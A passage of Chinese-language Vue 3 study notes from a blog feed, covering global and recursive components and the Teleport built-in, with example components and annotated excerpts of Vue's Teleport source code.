<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;card&quot;&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">      &lt;div&gt;标题&lt;/div&gt; &lt;div&gt;副标题&lt;/div&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    &lt;section&gt;</span><br><span class="line">      内容</span><br><span class="line">    &lt;/section&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">$border: #ccc;</span><br><span class="line">.card &#123;</span><br><span class="line">  border: 1px solid $border;</span><br><span class="line">  width: 400px;</span><br><span class="line">  header &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    padding: 5px;</span><br><span class="line">    border-bottom: 1px solid $border;</span><br><span class="line">  &#125;</span><br><span class="line">  section &#123;</span><br><span class="line">    padding: 5px;</span><br><span class="line">    min-height: 300px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Card&gt;&lt;/Card&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import Card from &#x27;./components/expame/Card.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="全局组件"><a href="#全局组件" class="headerlink" title="全局组件"></a>全局组件</h1><p>在当前系统中出现频率较高的组件，可以被封装成全局组件。</p>
<p>Card.vue同上。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Card&gt;&lt;/Card&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br></pre></td></tr></table></figure>

<p>main.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">CardVue</span> <span class="keyword">from</span> <span class="string">&#x27;./components/expame/Card.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册全局组件</span></span><br><span class="line">app.<span class="title function_">component</span>(<span class="string">&quot;Card&quot;</span>, <span class="title class_">CardVue</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="递归组件"><a href="#递归组件" class="headerlink" title="递归组件"></a>递归组件</h1><p>对组件内容进行复用。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Tree :data=&quot;data&quot;&gt;&lt;/Tree&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">import Tree from &quot;@/components/expame/Tree.vue&quot;</span><br><span class="line"></span><br><span class="line">interface TreeList &#123;</span><br><span class="line">  name: string,</span><br><span class="line">  checked: boolean,</span><br><span class="line">  children?: TreeList[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const data = reactive&lt;TreeList[]&gt;([</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;1&quot;,</span><br><span class="line">    checked: true,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;2&quot;,</span><br><span class="line">    checked: false,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;3&quot;,</span><br><span class="line">    checked: true,</span><br><span class="line">    children: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: &quot;3.1&quot;,</span><br><span class="line">        checked: false,</span><br><span class="line">        children: [</span><br><span class="line">          &#123;</span><br><span class="line">            name: &quot;3.1.1&quot;,</span><br><span class="line">            checked: false,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            name: &quot;3.1.2&quot;,</span><br><span class="line">            checked: false,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            name: &quot;3.1.3&quot;,</span><br><span class="line">            checked: true,</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        name: &quot;3.2&quot;,</span><br><span class="line">        checked: false,</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Tree.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 使用.stop阻止冒泡 --&gt;</span><br><span class="line">  &lt;!-- $是Vue提供的关键词，可以接收事件对象 --&gt;</span><br><span class="line">  &lt;div @click.stop=&quot;clickTap(item, $event)&quot; v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot; class=&quot;tree&quot;&gt;</span><br><span class="line">    &lt;input v-model=&quot;item.checked&quot; type=&quot;checkbox&quot;&gt; &lt;span&gt;&#123;&#123; item.name &#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;!-- 当该层递归还有子级时才进入下一层 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Vue3中，可以直接使用文件名当作递归组件的名称 --&gt;</span><br><span class="line">    &lt;!-- 但这样如果不想用这个名字，就只能更改文件名 --&gt;</span><br><span class="line">    &lt;Tree v-if=&quot;item?.children?.length&quot; :data=&quot;item.children&quot;&gt;&lt;/Tree&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 还可以导出该组件并起个别名，使用别名递归 --&gt;</span><br><span class="line">    &lt;!-- 但这样需要再写一个script --&gt;</span><br><span class="line">    &lt;!-- &lt;Test v-if=&quot;item?.children?.length&quot; :data=&quot;item.children&quot;&gt;&lt;/Test&gt; --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 也可以安装unplugin-vue-define-options插件 --&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line"></span><br><span class="line">interface TreeList &#123;</span><br><span class="line">  name: string,</span><br><span class="line">  checked: boolean,</span><br><span class="line">  children?: TreeList[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">defineProps&lt;&#123;</span><br><span class="line">  data?: TreeList[]</span><br><span class="line">&#125;&gt;()</span><br><span class="line"></span><br><span class="line">const clickTap = &lt;T extends Event&gt; (item: TreeList, e: T)=&gt; &#123;</span><br><span class="line">  // 默认存在冒泡，点击递归子级时会冒泡到递归父级</span><br><span class="line">  console.log(item, e)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- &lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">// 暴露导出该组件，并起个别名，这样就可以在该组件中以别的名字递归了</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;Test&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.tree &#123;</span><br><span class="line">  margin-left: 10px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Teleport传送组件</title>
    <url>/web/study/Vue/19.Teleport%E4%BC%A0%E9%80%81%E7%BB%84%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="teleport"><a href="#teleport" class="headerlink" title="teleport"></a>teleport</h1><p>Vue3.0新增的内置组件，可以将模板渲染至任何指定的DOM节点，不受父级style、v-show的影响，但data、prop数据仍能共用，类似React的Portal。</p>
<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;dialog&quot;&gt;</span><br><span class="line">    &lt;header class=&quot;header&quot;&gt;</span><br><span class="line">      &lt;div&gt;我是弹框&lt;/div&gt;</span><br><span class="line">      &lt;el-icon&gt;</span><br><span class="line">        &lt;CloseBold /&gt;</span><br><span class="line">      &lt;/el-icon&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    &lt;main class=&quot;main&quot;&gt;</span><br><span class="line">      我是内容12321321321</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">    &lt;footer class=&quot;footer&quot;&gt;</span><br><span class="line">      &lt;el-button size=&quot;small&quot;&gt;取消&lt;/el-button&gt;</span><br><span class="line">      &lt;el-button size=&quot;small&quot; type=&quot;primary&quot;&gt;确定&lt;/el-button&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&#x27;ts&#x27;&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.dialog &#123;</span><br><span class="line">  width: 400px;</span><br><span class="line">  height: 400px;</span><br><span class="line">  background: #141414;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  position: absolute;</span><br><span class="line">  left: 50%;</span><br><span class="line">  top: 50%;</span><br><span class="line">  margin-left: -200px;</span><br><span class="line">  margin-top: -200px;</span><br><span class="line"></span><br><span class="line">  .header &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    color: #CFD3DC;</span><br><span class="line">    border-bottom: 1px solid #636466;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .main &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">    color: #CFD3DC;</span><br><span class="line">    padding: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .footer &#123;</span><br><span class="line">    border-top: 1px solid #636466;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: flex-end;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;parent&quot;&gt;</span><br><span class="line">    &lt;h1&gt;我是父级&lt;/h1&gt;</span><br><span class="line">    &lt;!-- to可以接收各种DOM选择器 --&gt;</span><br><span class="line">    &lt;!-- disabled如果设为true，to属性就不会起作用，可以动态控制 --&gt;</span><br><span class="line">    &lt;Teleport to=&quot;body&quot; :disabled=&quot;true&quot;&gt;</span><br><span class="line">      &lt;A&gt;&lt;/A&gt;</span><br><span class="line">    &lt;/Teleport&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">* &#123;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">&#125;</span><br><span class="line">.parent &#123;</span><br><span class="line">  background-color: cyan;</span><br><span class="line">  height: 50vh;</span><br><span class="line">  // 对话框的父级parent被设为相对定位，所以通常情况下，对话框的绝对定位会受parent影响</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305221820136.png" alt="没有对A组件使用Teleport"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305221820138.png" alt="对A组件使用Teleport，并将其挂载至body下"></p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>组件会经过patch函数（<code>/package/runtime-core/src/renderer.ts</code>）去创建，如果是Teleport组件，patch函数会执行Teleport对象的process方法。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前后省略</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">TELEPORT</span>) &#123;</span><br><span class="line">          ;(<span class="keyword">type</span> <span class="keyword">as</span> <span class="keyword">typeof</span> <span class="title class_">TeleportImpl</span>).<span class="title function_">process</span>(</span><br><span class="line">            n1 <span class="keyword">as</span> <span class="title class_">TeleportVNode</span>,</span><br><span class="line">            n2 <span class="keyword">as</span> <span class="title class_">TeleportVNode</span>,</span><br><span class="line">            container,</span><br><span class="line">            anchor,</span><br><span class="line">            parentComponent,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            isSVG,</span><br><span class="line">            slotScopeIds,</span><br><span class="line">            optimized,</span><br><span class="line">            internals</span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在Vue源码（<code>/package/runtime-core/src/components/Teleport.ts</code>）中可以看到Teleport的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> resolveTarget = &lt;T = <span class="title class_">RendererElement</span>&gt;(</span><br><span class="line">  <span class="attr">props</span>: <span class="title class_">TeleportProps</span> | <span class="literal">null</span>,</span><br><span class="line">  <span class="attr">select</span>: <span class="title class_">RendererOptions</span>[<span class="string">&#x27;querySelector&#x27;</span>]</span><br><span class="line">): T | <span class="function"><span class="params">null</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 读取了Teleport props的to属性</span></span><br><span class="line">  <span class="keyword">const</span> targetSelector = props &amp;&amp; props.<span class="property">to</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isString</span>(targetSelector)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!select) &#123;</span><br><span class="line">      __DEV__ &amp;&amp;</span><br><span class="line">        <span class="title function_">warn</span>(</span><br><span class="line">          <span class="string">`Current renderer does not support string target for Teleports. `</span> +</span><br><span class="line">            <span class="string">`(missing querySelector renderer option)`</span></span><br><span class="line">        )</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 其实就是querySelector，读到了Teleport需要挂至的目标元素</span></span><br><span class="line">      <span class="keyword">const</span> target = <span class="title function_">select</span>(targetSelector)</span><br><span class="line">      <span class="keyword">if</span> (!target) &#123;</span><br><span class="line">        __DEV__ &amp;&amp;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`Failed to locate Teleport target with selector &quot;<span class="subst">$&#123;targetSelector&#125;</span>&quot;. `</span> +</span><br><span class="line">              <span class="string">`Note the target element must exist before the component is mounted - `</span> +</span><br><span class="line">              <span class="string">`i.e. the target cannot be rendered by the component itself, and `</span> +</span><br><span class="line">              <span class="string">`ideally should be outside of the entire Vue component tree.`</span></span><br><span class="line">          )</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> target <span class="keyword">as</span> T</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (__DEV__ &amp;&amp; !targetSelector &amp;&amp; !<span class="title function_">isTeleportDisabled</span>(props)) &#123;</span><br><span class="line">      <span class="title function_">warn</span>(<span class="string">`Invalid Teleport target: <span class="subst">$&#123;targetSelector&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 成功读到就返回目标元素</span></span><br><span class="line">    <span class="keyword">return</span> targetSelector <span class="keyword">as</span> T</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">TeleportImpl</span> = &#123;</span><br><span class="line">  <span class="attr">__isTeleport</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 创建、更新</span></span><br><span class="line">  <span class="title function_">process</span>(<span class="params"></span></span><br><span class="line"><span class="params">    n1: TeleportVNode | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    n2: TeleportVNode,</span></span><br><span class="line"><span class="params">    container: RendererElement,</span></span><br><span class="line"><span class="params">    anchor: RendererNode | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentComponent: ComponentInternalInstance | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentSuspense: SuspenseBoundary | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    isSVG: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    slotScopeIds: <span class="built_in">string</span>[] | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    optimized: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    internals: RendererInternals</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">      <span class="attr">mc</span>: mountChildren,</span><br><span class="line">      <span class="attr">pc</span>: patchChildren,</span><br><span class="line">      <span class="attr">pbc</span>: patchBlockChildren,</span><br><span class="line">      <span class="attr">o</span>: &#123; insert, querySelector, createText, createComment &#125;</span><br><span class="line">    &#125; = internals</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> disabled = <span class="title function_">isTeleportDisabled</span>(n2.<span class="property">props</span>)</span><br><span class="line">    <span class="keyword">let</span> &#123; shapeFlag, children, dynamicChildren &#125; = n2</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3302</span></span><br><span class="line">    <span class="comment">// HMR updated, force full diff</span></span><br><span class="line">    <span class="keyword">if</span> (__DEV__ &amp;&amp; isHmrUpdating) &#123;</span><br><span class="line">      optimized = <span class="literal">false</span></span><br><span class="line">      dynamicChildren = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n1 == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// insert anchors in the main view</span></span><br><span class="line">      <span class="comment">// 创建逻辑</span></span><br><span class="line">      <span class="keyword">const</span> placeholder = (n2.<span class="property">el</span> = __DEV__</span><br><span class="line">        ? <span class="title function_">createComment</span>(<span class="string">&#x27;teleport start&#x27;</span>)</span><br><span class="line">        : <span class="title function_">createText</span>(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">      <span class="keyword">const</span> mainAnchor = (n2.<span class="property">anchor</span> = __DEV__</span><br><span class="line">        ? <span class="title function_">createComment</span>(<span class="string">&#x27;teleport end&#x27;</span>)</span><br><span class="line">        : <span class="title function_">createText</span>(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">      <span class="title function_">insert</span>(placeholder, container, anchor)</span><br><span class="line">      <span class="title function_">insert</span>(mainAnchor, container, anchor)</span><br><span class="line">      <span class="comment">// 获取目标移动到的DOM节点</span></span><br><span class="line">      <span class="keyword">const</span> target = (n2.<span class="property">target</span> = <span class="title function_">resolveTarget</span>(n2.<span class="property">props</span>, querySelector))</span><br><span class="line">      <span class="keyword">const</span> targetAnchor = (n2.<span class="property">targetAnchor</span> = <span class="title function_">createText</span>(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">      <span class="keyword">if</span> (target) &#123;</span><br><span class="line">        <span class="title function_">insert</span>(targetAnchor, target)</span><br><span class="line">        <span class="comment">// #2652 we could be teleporting from a non-SVG tree into an SVG tree</span></span><br><span class="line">        isSVG = isSVG || <span class="title function_">isTargetSVG</span>(target)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__ &amp;&amp; !disabled) &#123;</span><br><span class="line">        <span class="title function_">warn</span>(<span class="string">&#x27;Invalid Teleport target on mount:&#x27;</span>, target, <span class="string">`(<span class="subst">$&#123;<span class="keyword">typeof</span> target&#125;</span>)`</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将组件挂载到目标节点上</span></span><br><span class="line">      <span class="keyword">const</span> <span class="title function_">mount</span> = (<span class="params">container: RendererElement, anchor: RendererNode</span>) =&gt; &#123;</span><br><span class="line">        <span class="comment">// Teleport *always* has Array children. This is enforced in both the</span></span><br><span class="line">        <span class="comment">// compiler and vnode children normalization.</span></span><br><span class="line">        <span class="comment">// 挂载子节点</span></span><br><span class="line">        <span class="keyword">if</span> (shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span class="property">ARRAY_CHILDREN</span>) &#123;</span><br><span class="line">          <span class="title function_">mountChildren</span>(</span><br><span class="line">            children <span class="keyword">as</span> <span class="title class_">VNodeArrayChildren</span>,</span><br><span class="line">            container,</span><br><span class="line">            anchor,</span><br><span class="line">            parentComponent,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            isSVG,</span><br><span class="line">            slotScopeIds,</span><br><span class="line">            optimized</span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果disabled为true，挂载到原先的位置，否则挂载到to的目标</span></span><br><span class="line">      <span class="keyword">if</span> (disabled) &#123;</span><br><span class="line">        <span class="title function_">mount</span>(container, mainAnchor)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target) &#123;</span><br><span class="line">        <span class="title function_">mount</span>(target, targetAnchor)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// update content</span></span><br><span class="line">      <span class="comment">// 更新逻辑</span></span><br><span class="line">      n2.<span class="property">el</span> = n1.<span class="property">el</span></span><br><span class="line">      <span class="keyword">const</span> mainAnchor = (n2.<span class="property">anchor</span> = n1.<span class="property">anchor</span>)!</span><br><span class="line">      <span class="keyword">const</span> target = (n2.<span class="property">target</span> = n1.<span class="property">target</span>)!</span><br><span class="line">      <span class="keyword">const</span> targetAnchor = (n2.<span class="property">targetAnchor</span> = n1.<span class="property">targetAnchor</span>)!</span><br><span class="line">      <span class="keyword">const</span> wasDisabled = <span class="title function_">isTeleportDisabled</span>(n1.<span class="property">props</span>)</span><br><span class="line">      <span class="keyword">const</span> currentContainer = wasDisabled ? container : target</span><br><span class="line">      <span class="keyword">const</span> currentAnchor = wasDisabled ? mainAnchor : targetAnchor</span><br><span class="line">      isSVG = isSVG || <span class="title function_">isTargetSVG</span>(target)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (dynamicChildren) &#123;</span><br><span class="line">        <span class="comment">// fast path when the teleport happens to be a block root</span></span><br><span class="line">        <span class="title function_">patchBlockChildren</span>(</span><br><span class="line">          n1.<span class="property">dynamicChildren</span>!,</span><br><span class="line">          dynamicChildren,</span><br><span class="line">          currentContainer,</span><br><span class="line">          parentComponent,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          isSVG,</span><br><span class="line">          slotScopeIds</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// even in block tree mode we need to make sure all root-level nodes</span></span><br><span class="line">        <span class="comment">// in the teleport inherit previous DOM references so that they can</span></span><br><span class="line">        <span class="comment">// be moved in future patches.</span></span><br><span class="line">        <span class="title function_">traverseStaticChildren</span>(n1, n2, <span class="literal">true</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!optimized) &#123;</span><br><span class="line">        <span class="title function_">patchChildren</span>(</span><br><span class="line">          n1,</span><br><span class="line">          n2,</span><br><span class="line">          currentContainer,</span><br><span class="line">          currentAnchor,</span><br><span class="line">          parentComponent,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          isSVG,</span><br><span class="line">          slotScopeIds,</span><br><span class="line">          <span class="literal">false</span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (disabled) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!wasDisabled) &#123;</span><br><span class="line">          <span class="comment">// enabled -&gt; disabled</span></span><br><span class="line">          <span class="comment">// move into main container</span></span><br><span class="line">          <span class="comment">// 如果新节点disabled为true，旧节点disabled为false，就把子节点移回原位</span></span><br><span class="line">          <span class="title function_">moveTeleport</span>(</span><br><span class="line">            n2,</span><br><span class="line">            container,</span><br><span class="line">            mainAnchor,</span><br><span class="line">            internals,</span><br><span class="line">            <span class="title class_">TeleportMoveTypes</span>.<span class="property">TOGGLE</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// target changed</span></span><br><span class="line">        <span class="keyword">if</span> ((n2.<span class="property">props</span> &amp;&amp; n2.<span class="property">props</span>.<span class="property">to</span>) !== (n1.<span class="property">props</span> &amp;&amp; n1.<span class="property">props</span>.<span class="property">to</span>)) &#123;</span><br><span class="line">          <span class="keyword">const</span> nextTarget = (n2.<span class="property">target</span> = <span class="title function_">resolveTarget</span>(</span><br><span class="line">            n2.<span class="property">props</span>,</span><br><span class="line">            querySelector</span><br><span class="line">          ))</span><br><span class="line">          <span class="keyword">if</span> (nextTarget) &#123;</span><br><span class="line">            <span class="title function_">moveTeleport</span>(</span><br><span class="line">              n2,</span><br><span class="line">              nextTarget,</span><br><span class="line">              <span class="literal">null</span>,</span><br><span class="line">              internals,</span><br><span class="line">              <span class="title class_">TeleportMoveTypes</span>.<span class="property">TARGET_CHANGE</span></span><br><span class="line">            )</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            <span class="title function_">warn</span>(</span><br><span class="line">              <span class="string">&#x27;Invalid Teleport target on update:&#x27;</span>,</span><br><span class="line">              target,</span><br><span class="line">              <span class="string">`(<span class="subst">$&#123;<span class="keyword">typeof</span> target&#125;</span>)`</span></span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (wasDisabled) &#123;</span><br><span class="line">          <span class="comment">// disabled -&gt; enabled</span></span><br><span class="line">          <span class="comment">// move into teleport target</span></span><br><span class="line">          <span class="comment">// 如果新节点disabled为false，旧节点disabled为true，就把子节点移到目标元素</span></span><br><span class="line">          <span class="title function_">moveTeleport</span>(</span><br><span class="line">            n2,</span><br><span class="line">            target,</span><br><span class="line">            targetAnchor,</span><br><span class="line">            internals,</span><br><span class="line">            <span class="title class_">TeleportMoveTypes</span>.<span class="property">TOGGLE</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">updateCssVars</span>(n2)</span><br><span class="line">  &#125;,</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 删除</span></span><br><span class="line">  <span class="title function_">remove</span>(<span class="params"></span></span><br><span class="line"><span class="params">    vnode: VNode,</span></span><br><span class="line"><span class="params">    parentComponent: ComponentInternalInstance | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentSuspense: SuspenseBoundary | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    optimized: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    &#123; um: unmount, o: &#123; remove: hostRemove &#125; &#125;: RendererInternals,</span></span><br><span class="line"><span class="params">    doRemove: <span class="built_in">Boolean</span></span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; shapeFlag, children, anchor, targetAnchor, target, props &#125; = vnode</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target) &#123;</span><br><span class="line">      <span class="title function_">hostRemove</span>(targetAnchor!)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an unmounted teleport should always remove its children if not disabled</span></span><br><span class="line">    <span class="keyword">if</span> (doRemove || !<span class="title function_">isTeleportDisabled</span>(props)) &#123;</span><br><span class="line">      <span class="title function_">hostRemove</span>(anchor!)</span><br><span class="line">      <span class="keyword">if</span> (shapeFlag &amp; <span class="title class_">ShapeFlags</span>.<span 